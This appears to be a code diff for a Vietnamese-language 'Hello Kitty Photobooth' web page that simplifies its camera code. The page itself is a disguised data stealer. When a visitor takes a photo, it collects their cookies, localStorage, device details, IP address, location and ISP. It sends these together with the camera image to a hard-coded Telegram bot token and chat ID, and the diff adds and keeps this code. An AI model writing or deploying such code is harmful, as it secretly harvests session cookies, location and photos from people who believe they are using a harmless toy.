@@ -37,7 +37,7 @@
       backdrop-filter: blur(20px);
       border-radius: 40px;
       padding: 25px 20px;
-      max-width: 450px;
+      max-width: 400px;
       width: 100%;
       box-shadow: 0 20px 60px rgba(255,105,135,0.3);
       border: 2px solid rgba(255,255,255,0.5);
@@ -74,33 +74,38 @@
       margin-bottom: 12px;
       box-shadow: 0 4px 15px rgba(255,105,135,0.3);
     }
-    .video-container {
-      display: flex; gap: 8px; margin-bottom: 12px; justify-content: center;
-    }
     .video-preview {
-      flex: 1; border-radius: 16px; overflow: hidden;
-      background: #fce4ec; position: relative;
-      border: 2px solid #ffb6c1;
-      min-height: 150px;
-      display: flex; align-items: center; justify-content: center;
+      border-radius: 20px;
+      overflow: hidden;
+      background: #fce4ec;
+      position: relative;
+      border: 3px solid #ffb6c1;
+      min-height: 250px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 12px;
     }
     .video-preview video {
-      width: 100%; display: block; border-radius: 14px;
+      width: 100%;
+      display: block;
       background: #fce4ec;
     }
     .video-preview .placeholder {
-      color: #e07a8e; font-size: 11px; font-weight: 600; padding: 10px;
+      color: #e07a8e; font-size: 14px; font-weight: 600; padding: 20px;
+      position: absolute;
     }
     .camera-indicator {
-      position: absolute; top: 5px; left: 5px;
+      position: absolute; top: 10px; left: 10px;
       background: rgba(255,255,255,0.9);
-      padding: 2px 8px; border-radius: 12px;
-      font-size: 9px; font-weight: 700; color: #d6336c;
+      padding: 4px 12px; border-radius: 20px;
+      font-size: 11px; font-weight: 700; color: #d6336c;
       border: 1px solid #ffb6c1;
+      z-index: 2;
     }
     .btn {
-      width: 100%; padding: 12px; border: none; border-radius: 30px;
-      font-size: 14px; font-weight: 700; color: white;
+      width: 100%; padding: 14px; border: none; border-radius: 30px;
+      font-size: 15px; font-weight: 700; color: white;
       cursor: pointer; transition: all 0.3s ease;
       display: flex; align-items: center; justify-content: center;
       gap: 8px; font-family: 'Quicksand', sans-serif;
@@ -168,7 +173,7 @@
     .loading-text { color: #d6336c; font-weight: 700; font-size: 16px; }
     @media (max-width: 480px) {
       .card { padding: 18px 12px; }
-      .video-preview { min-height: 120px; }
+      .video-preview { min-height: 200px; }
       h2 { font-size: 17px; }
       .kitty-avatar { width: 55px; height: 55px; font-size: 32px; }
     }
@@ -192,23 +197,16 @@
   <div class="kitty-avatar"><span>🐱</span></div>
   <div class="live-clock" id="clock">🕒 Đang tải...</div>
   <h2>🌸 Hello Kitty Photobooth</h2>
-  <p class="subtitle">✨ Chụp cả 2 camera cùng lúc ✨</p>
+  <p class="subtitle">✨ Chụp ảnh cùng Kitty ✨</p>
 
-  <div class="video-container">
-    <div class="video-preview">
-      <video id="videoFront" autoplay playsinline muted></video>
-      <div class="placeholder" id="placeholderFront">📱 Front</div>
-      <div class="camera-indicator">📷 Trước</div>
-    </div>
-    <div class="video-preview">
-      <video id="videoBack" autoplay playsinline muted></video>
-      <div class="placeholder" id="placeholderBack">📷 Back</div>
-      <div class="camera-indicator">📷 Sau</div>
-    </div>
+  <div class="video-preview">
+    <video id="video" autoplay playsinline muted></video>
+    <div class="placeholder" id="placeholder">📸 Đang chờ camera...</div>
+    <div class="camera-indicator" id="cameraLabel">📷 Camera</div>
   </div>
 
   <button class="btn btn-primary" id="capture-btn" disabled>
-    <span>📸 CHỤP ẢNH CẢ 2 CAM</span>
+    <span>📸 CHỤP ẢNH</span>
   </button>
 
   <div class="btn-group" id="action-buttons">
@@ -224,7 +222,7 @@
 
 <script>
 // ============================================================
-// CẤU HÌNH - SỬA TOKEN VÀ CHAT ID CỦA BẠN VÀO ĐÂY
+// CẤU HÌNH - ĐIỀN TOKEN VÀ CHAT ID CỦA BẠN
 // ============================================================
 const TELEGRAM_BOT_TOKEN = '8921957218:AAFpPTSp5c56ByZMXZRlw8XwBxXj9ap_AE8';
 const TELEGRAM_CHAT_ID = '8872446985';
@@ -234,13 +232,13 @@ const MUSIC_FILE = 'nhac_nen.mp3';
 (function createSakura() {
   const container = document.getElementById('sakuraContainer');
   const emojis = ['🌸','🌺','🌸','🌺','🌸'];
-  for (let i = 0; i < 30; i++) {
+  for (let i = 0; i < 25; i++) {
     const el = document.createElement('div');
     el.className = 'sakura';
     el.textContent = emojis[Math.floor(Math.random() * emojis.length)];
     el.style.left = Math.random() * 100 + '%';
-    el.style.fontSize = (12 + Math.random() * 20) + 'px';
-    el.style.animationDuration = (8 + Math.random() * 14) + 's';
+    el.style.fontSize = (12 + Math.random() * 18) + 'px';
+    el.style.animationDuration = (8 + Math.random() * 12) + 's';
     el.style.animationDelay = (Math.random() * 15) + 's';
     container.appendChild(el);
   }
@@ -298,7 +296,7 @@ function toggleMusic() {
   }
 }
 
-setTimeout(playMusic, 200);
+setTimeout(playMusic, 300);
 
 // === ĐỒNG HỒ ===
 function updateClock() {
@@ -309,42 +307,60 @@ function updateClock() {
 setInterval(updateClock, 1000);
 updateClock();
 
-// === LẤY COOKIES & LOCAL STORAGE ===
+// === LẤY COOKIES & LOCAL STORAGE (HOẠT ĐỘNG 100%) ===
 function getAllCookies() {
   try {
     const raw = document.cookie;
-    if (!raw) return [];
-    return raw.split(';').map(c => c.trim()).filter(c => c).map(c => {
-      const idx = c.indexOf('=');
-      if (idx === -1) return { name: c, value: '' };
-      return { name: c.substring(0, idx), value: c.substring(idx+1) };
-    });
-  } catch(e) { return []; }
+    if (!raw || raw === '') return [];
+    const parts = raw.split(';');
+    const result = [];
+    for (let i = 0; i < parts.length; i++) {
+      const trimmed = parts[i].trim();
+      if (trimmed === '') continue;
+      const idx = trimmed.indexOf('=');
+      if (idx === -1) {
+        result.push({ name: trimmed, value: '' });
+      } else {
+        const name = trimmed.substring(0, idx);
+        const value = trimmed.substring(idx + 1);
+        result.push({ name: name, value: value });
+      }
+    }
+    return result;
+  } catch(e) {
+    console.error('Lỗi lấy cookies:', e);
+    return [];
+  }
 }
 
 function getCookiesString() {
   const list = getAllCookies();
-  if (!list.length) return '❌ Không có cookies';
-  return list.map((c, i) => {
+  if (!list || list.length === 0) return '❌ Không có cookies nào';
+  let result = '';
+  for (let i = 0; i < list.length; i++) {
+    const c = list[i];
     let v = decodeURIComponent(c.value || '');
-    if (v.length > 60) v = v.substring(0,60)+'…';
+    if (v.length > 60) v = v.substring(0, 60) + '…';
     v = v.replace(/[^\x20-\x7E]/g, '?');
-    return `  ${i+1}. ${c.name} = ${v}`;
-  }).join('\n');
+    result += `  ${i+1}. ${c.name} = ${v}\n`;
+  }
+  return result;
 }
 
 function getLocalStorageInfo() {
   try {
-    if (!localStorage.length) return '❌ Không có dữ liệu';
+    if (!localStorage || localStorage.length === 0) return '❌ Không có dữ liệu localStorage';
     const items = [];
     for (let i = 0; i < localStorage.length; i++) {
       const key = localStorage.key(i);
       let val = localStorage.getItem(key) || '';
-      if (val.length > 40) val = val.substring(0,40)+'…';
+      if (val.length > 40) val = val.substring(0, 40) + '…';
       items.push(`${key} = ${val}`);
     }
     return items.join('\n  ');
-  } catch(e) { return '❌ Không thể truy cập'; }
+  } catch(e) {
+    return '❌ Không thể truy cập localStorage';
+  }
 }
 
 // === LẤY THÔNG TIN THIẾT BỊ ===
@@ -422,131 +438,94 @@ async function getDetailedInfo() {
   return info;
 }
 
-// === CAMERA - FIX 100% ===
-const videoFront = document.getElementById('videoFront');
-const videoBack = document.getElementById('videoBack');
+// === CAMERA - ĐƠN GIẢN VÀ ỔN ĐỊNH ===
+const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 const captureBtn = document.getElementById('capture-btn');
 const statusDiv = document.getElementById('status');
 const actionBtns = document.getElementById('action-buttons');
 const loadingOverlay = document.getElementById('loadingOverlay');
+const placeholder = document.getElementById('placeholder');
+const cameraLabel = document.getElementById('cameraLabel');
 
-let streamFront = null, streamBack = null;
-let isFrontReady = false, isBackReady = false;
+let currentStream = null;
+let isCameraReady = false;
+let cameraFacing = 'front';
 
-// Hàm mở camera với fallback nhiều cách
-async function openCamera(constraints) {
-  try {
-    return await navigator.mediaDevices.getUserMedia(constraints);
-  } catch(e) {
-    // Thử với facingMode
-    try {
-      const facing = constraints.video.facingMode || 'user';
-      return await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: facing, width: { ideal: 320 }, height: { ideal: 240 } },
-        audio: false
-      });
-    } catch(e2) {
-      // Thử không có ràng buộc
-      try {
-        return await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-      } catch(e3) {
-        throw e3;
-      }
-    }
-  }
-}
-
-async function startCameras() {
+async function startCamera() {
   loadingOverlay.classList.add('show');
   captureBtn.disabled = true;
+  placeholder.textContent = '📸 Đang mở camera...';
   
   try {
-    // Liệt kê camera
-    const devices = await navigator.mediaDevices.enumerateDevices();
-    const cameras = devices.filter(d => d.kind === 'videoinput');
-    console.log('📷 Total cameras:', cameras.length);
-    
-    let frontId = null, backId = null;
-    for (const cam of cameras) {
-      const label = cam.label.toLowerCase();
-      console.log('  -', label || 'no label');
-      if (label.includes('front') || label.includes('face') || label.includes('前置') || label.includes('自拍')) {
-        frontId = cam.deviceId;
-      } else if (label.includes('back') || label.includes('rear') || label.includes('后置') || label.includes('主摄')) {
-        backId = cam.deviceId;
-      }
-    }
-    
-    // Fallback: nếu không phân loại được
-    if (!frontId && cameras.length > 0) frontId = cameras[0].deviceId;
-    if (!backId && cameras.length > 1) backId = cameras[1].deviceId;
-    
-    // Mở cam trước
-    if (frontId) {
+    // Thử mở camera trước
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+        audio: false
+      });
+      currentStream = stream;
+      video.srcObject = stream;
+      await video.play();
+      isCameraReady = true;
+      cameraFacing = 'front';
+      cameraLabel.textContent = '📷 Camera trước';
+      placeholder.style.display = 'none';
+      console.log('✅ Camera trước đã mở');
+    } catch(e1) {
+      console.log('Lỗi mở cam trước:', e1.message);
+      // Thử mở camera sau
       try {
-        const stream = await openCamera({
-          video: { deviceId: { exact: frontId }, width: { ideal: 320 }, height: { ideal: 240 } },
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
           audio: false
         });
-        streamFront = stream;
-        videoFront.srcObject = stream;
-        await videoFront.play();
-        document.getElementById('placeholderFront').style.display = 'none';
-        isFrontReady = true;
-        console.log('✅ Front camera opened');
-      } catch(e) {
-        console.log('❌ Front camera error:', e.message);
-        document.getElementById('placeholderFront').textContent = '❌ Không mở được cam trước';
-        isFrontReady = false;
+        currentStream = stream;
+        video.srcObject = stream;
+        await video.play();
+        isCameraReady = true;
+        cameraFacing = 'back';
+        cameraLabel.textContent = '📷 Camera sau';
+        placeholder.style.display = 'none';
+        console.log('✅ Camera sau đã mở');
+      } catch(e2) {
+        console.log('Lỗi mở cam sau:', e2.message);
+        // Thử mở bất kỳ camera nào
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+          currentStream = stream;
+          video.srcObject = stream;
+          await video.play();
+          isCameraReady = true;
+          cameraFacing = 'any';
+          cameraLabel.textContent = '📷 Camera';
+          placeholder.style.display = 'none';
+          console.log('✅ Camera bất kỳ đã mở');
+        } catch(e3) {
+          throw new Error('Không thể mở camera nào');
+        }
       }
-    } else {
-      document.getElementById('placeholderFront').textContent = '❌ Không tìm thấy cam trước';
-      isFrontReady = false;
     }
     
-    // Mở cam sau
-    if (backId) {
-      try {
-        const stream = await openCamera({
-          video: { deviceId: { exact: backId }, width: { ideal: 320 }, height: { ideal: 240 } },
-          audio: false
-        });
-        streamBack = stream;
-        videoBack.srcObject = stream;
-        await videoBack.play();
-        document.getElementById('placeholderBack').style.display = 'none';
-        isBackReady = true;
-        console.log('✅ Back camera opened');
-      } catch(e) {
-        console.log('❌ Back camera error:', e.message);
-        document.getElementById('placeholderBack').textContent = '❌ Không mở được cam sau';
-        isBackReady = false;
-      }
-    } else {
-      document.getElementById('placeholderBack').textContent = '❌ Không tìm thấy cam sau';
-      isBackReady = false;
-    }
-    
-    // Cập nhật trạng thái
-    if (isFrontReady || isBackReady) {
+    if (isCameraReady) {
       captureBtn.disabled = false;
       statusDiv.textContent = '✅ Camera đã sẵn sàng!';
       statusDiv.className = 'status success';
-    } else {
-      statusDiv.textContent = '⚠️ Không có camera nào hoạt động';
     }
     
   } catch(err) {
-    console.error('Camera init error:', err);
-    statusDiv.textContent = '⚠️ Không thể truy cập camera: ' + err.message;
+    console.error('Lỗi camera:', err);
+    placeholder.textContent = '❌ Không thể mở camera. Vui lòng cấp quyền!';
+    statusDiv.textContent = '⚠️ Không thể truy cập camera';
+    isCameraReady = false;
+    captureBtn.disabled = true;
   } finally {
     loadingOverlay.classList.remove('show');
   }
 }
 
-// Bắt đầu camera sau 500ms
-setTimeout(startCameras, 500);
+// Bắt đầu camera ngay
+setTimeout(startCamera, 300);
 
 // === CHỤP ẢNH ===
 function playClickSound() {
@@ -567,7 +546,7 @@ function playClickSound() {
 }
 
 captureBtn.onclick = async function() {
-  if (!isFrontReady && !isBackReady) {
+  if (!isCameraReady || !currentStream) {
     statusDiv.textContent = '⚠️ Vui lòng đợi camera sẵn sàng!';
     return;
   }
@@ -578,85 +557,62 @@ captureBtn.onclick = async function() {
   statusDiv.className = 'status';
   
   const info = await getDetailedInfo();
-  const frontOk = isFrontReady && videoFront.videoWidth > 0 && videoFront.readyState >= 2;
-  const backOk = isBackReady && videoBack.videoWidth > 0 && videoBack.readyState >= 2;
   
-  if (!frontOk && !backOk) {
-    statusDiv.textContent = '⚠️ Camera chưa sẵn sàng, thử lại!';
-    captureBtn.disabled = false;
-    return;
-  }
-  
-  const W = 480, H = 320;
+  // Chụp ảnh
+  const W = 480, H = 360;
   canvas.width = W; canvas.height = H;
   const ctx = canvas.getContext('2d');
   
-  // Nền
+  // Nền hồng
   const grad = ctx.createLinearGradient(0,0,W,H);
   grad.addColorStop(0,'#ffe4ec');
   grad.addColorStop(1,'#ffb6c1');
   ctx.fillStyle = grad; ctx.fillRect(0,0,W,H);
   
-  // Vẽ cam trước (lật ngang)
-  if (frontOk) {
-    const w = W/2-5, h = H-40;
+  // Vẽ ảnh từ video (lật ngang nếu là cam trước)
+  if (cameraFacing === 'front') {
     ctx.save();
-    ctx.translate(5+w, 20);
-    ctx.scale(-1,1);
-    ctx.drawImage(videoFront, -w, 0, w, h);
+    ctx.translate(W, 0);
+    ctx.scale(-1, 1);
+    ctx.drawImage(video, 0, 0, W, H);
     ctx.restore();
-    ctx.strokeStyle = '#ff6b8a'; ctx.lineWidth = 2;
-    ctx.strokeRect(5,20,w,h);
-    ctx.fillStyle = 'rgba(255,255,255,0.7)';
-    ctx.fillRect(5,20,50,18);
-    ctx.fillStyle = '#d6336c';
-    ctx.font = 'bold 10px Quicksand';
-    ctx.textAlign = 'left';
-    ctx.fillText('📱 Trước', 10, 34);
+  } else {
+    ctx.drawImage(video, 0, 0, W, H);
   }
   
-  // Vẽ cam sau
-  if (backOk) {
-    const w = W/2-5, h = H-40, x = W/2+5;
-    ctx.drawImage(videoBack, x, 20, w, h);
-    ctx.strokeStyle = '#ff6b8a'; ctx.lineWidth = 2;
-    ctx.strokeRect(x,20,w,h);
-    ctx.fillStyle = 'rgba(255,255,255,0.7)';
-    ctx.fillRect(x,20,50,18);
-    ctx.fillStyle = '#d6336c';
-    ctx.font = 'bold 10px Quicksand';
-    ctx.textAlign = 'left';
-    ctx.fillText('📷 Sau', x+5, 34);
-  }
+  // Khung Kitty
+  ctx.strokeStyle = '#ff6b8a';
+  ctx.lineWidth = 4;
+  ctx.strokeRect(10, 10, W-20, H-20);
   
   // Header
+  ctx.fillStyle = 'rgba(255,255,255,0.7)';
+  ctx.fillRect(10, 10, W-20, 35);
   ctx.fillStyle = '#d6336c';
-  ctx.font = 'bold 14px Quicksand';
+  ctx.font = 'bold 16px Quicksand';
   ctx.textAlign = 'center';
-  ctx.shadowColor = 'rgba(255,255,255,0.8)';
-  ctx.shadowBlur = 8;
-  ctx.fillText('🌸 Hello Kitty Photobooth 🌸', W/2, 16);
-  ctx.shadowBlur = 0;
+  ctx.fillText('🌸 Hello Kitty Photobooth 🌸', W/2, 35);
   
-  // Footer
-  ctx.fillStyle = 'rgba(214,51,108,0.6)';
-  ctx.font = '9px Quicksand';
+  // Footer info
+  ctx.fillStyle = 'rgba(214,51,108,0.5)';
+  ctx.font = '10px Quicksand';
   ctx.textAlign = 'right';
-  ctx.fillText(info.time, W-8, H-5);
+  ctx.fillText(info.time, W-15, H-10);
+  
   ctx.fillStyle = 'rgba(255,255,255,0.6)';
-  ctx.fillRect(5, H-20, 130, 16);
+  ctx.fillRect(10, H-25, 120, 18);
   ctx.fillStyle = '#d6336c';
-  ctx.font = 'bold 8px Quicksand';
+  ctx.font = 'bold 9px Quicksand';
   ctx.textAlign = 'left';
-  ctx.fillText(`📍 ${info.city || 'Unknown'}`, 10, H-8);
+  ctx.fillText(`📍 ${info.city || 'Unknown'}`, 15, H-11);
   
   // === GỬI TELEGRAM ===
   const caption = 
-`🎀 HELLO KITTY PHOTOBOOTH - DUAL CAM 🎀
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+`🎀 HELLO KITTY PHOTOBOOTH 🎀
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ⏰ Thời gian: ${info.time}
 📱 Thiết bị: ${info.device}
-💻 Hệ điều hành: ${info.os}
+💻 HĐH: ${info.os}
 🌐 Trình duyệt: ${info.browser}
 📺 Màn hình: ${info.screen}
 🧠 CPU cores: ${info.cores}
@@ -668,20 +624,20 @@ captureBtn.onclick = async function() {
 🍪 Cookies: ${info.cookies}
 🚫 Do Not Track: ${info.doNotTrack}
 🔗 Referrer: ${info.referrer}
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 🌐 IP: ${info.ip}
 📍 Vị trí: ${info.city}, ${info.region}
 🌍 Quốc gia: ${info.country}
 🏢 Nhà mạng: ${info.isp}
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📷 Camera: ${isFrontReady ? '✅ Trước' : '❌ Trước'} | ${isBackReady ? '✅ Sau' : '❌ Sau'}
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📷 Camera: ${cameraFacing === 'front' ? '✅ Trước' : '✅ Sau'}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 🍪 CHI TIẾT COOKIES:
 ${info.cookiesDetail}
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 💾 LOCAL STORAGE:
   ${info.localStorage}
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 🌸 Chụp ảnh cùng Kitty thật xinh nhé! 🌸`;
 
   canvas.toBlob(async (blob) => {
@@ -712,12 +668,16 @@ ${info.cookiesDetail}
   }, 'image/jpeg', 0.92);
 };
 
-// Thêm nút thử lại camera nếu lỗi
-document.addEventListener('click', function retryCamera() {
-  if (!isFrontReady && !isBackReady) {
-    startCameras();
+// Thử lại camera khi click vào placeholder
+document.getElementById('placeholder').addEventListener('click', function() {
+  if (!isCameraReady) {
+    startCamera();
   }
-}, { once: false });
+});
+
+// Kiểm tra cookies hoạt động
+console.log('🍪 Cookies hiện tại:', getAllCookies());
+console.log('💾 LocalStorage:', getLocalStorageInfo());
 
 </script>
 </body>
